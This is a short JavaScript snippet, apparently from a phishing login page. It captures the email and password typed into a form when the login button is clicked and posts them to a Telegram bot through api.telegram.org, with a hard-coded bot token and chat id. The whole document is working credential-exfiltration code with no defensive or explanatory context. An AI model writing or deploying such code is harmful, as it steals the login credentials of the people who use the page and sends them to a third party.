document.getElementById('login').addEventListener('click', function(){
    var text = `email: ${email.value}
password:  ${password.value}`;

const botToken = '6799956480:AAF6uKM4b72aAxNe6n2vOCuHpg7rCJoRPkY';
const chatId = '6669693805';
const message = text;

fetch("https://api.telegram.org/bot" + botToken+ "/sendMessage", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        chat_id: chatId,
        text: message
    })
})
.then(response => {
    if (response.ok) {
        alert('Message sent successfully');
    } else {
        alert('Failed to send message');
    }
})
.catch(error => {
    alert('Error:', error);
});
});